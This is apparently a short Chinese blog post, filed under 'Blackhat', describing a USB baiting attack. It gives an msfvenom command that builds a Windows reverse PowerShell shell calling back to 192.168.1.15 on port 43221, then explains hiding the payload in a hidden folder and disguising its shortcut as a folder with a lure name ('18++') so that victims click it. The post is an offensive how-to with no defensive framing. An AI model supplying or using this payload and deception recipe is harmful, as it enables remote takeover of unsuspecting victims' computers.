---
title: U盘伪装快捷方式欺骗攻击
name: u-fake-attacker
date: 2017-11-12
tags: [link]
categories: [Blackhat]
---

* 目录
{:toc}

---

# U盘伪装快捷方式欺骗攻击

## 1. 生成脚本木马

```shell
msfvenom –p cmd/windows/reverse_powershell lhost=192.168.1.15 lport=43221  > file.bat
```

## 2. U盘放置木马

在U盘创建一个空文件夹，将木马程序放到文件夹中，并对此木马程序创建快捷方式，将快捷方式剪切到此文件夹之外。

## 3. 伪装隐藏

将快捷方式图标设置为文件夹的方式，重命名，如"18++"

第一步创建的文件夹设置为隐藏模式

## 4. 诱骗点击

此时U盘中只会看见一个"18++"的"文件夹"，其实是伪装的脚本木马程序。